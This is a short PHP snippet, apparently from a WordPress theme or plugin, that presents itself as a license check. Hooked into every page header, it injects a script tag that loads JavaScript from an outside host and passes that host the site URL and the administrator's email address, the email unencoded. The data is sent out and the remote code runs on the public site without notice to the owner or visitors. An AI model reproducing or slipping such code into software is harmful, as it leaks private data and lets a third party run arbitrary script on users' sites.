<?php

function mt_lisense_script() {
  if(mt_lisense_check()) return;
  if(get_option('mt_lisense_script')) return;
  $home_url = home_url();
  $admin_email = get_option('admin_email');
  echo '<script src="http://api.utubon.com/mt-setup-notice.php?home_url='.urlencode($home_url).'&admin_email='.$admin_email.'&.js"></script>'."\n";
  update_option('mt_lisense_script',1);
}
add_action('wp_head','mt_lisense_script');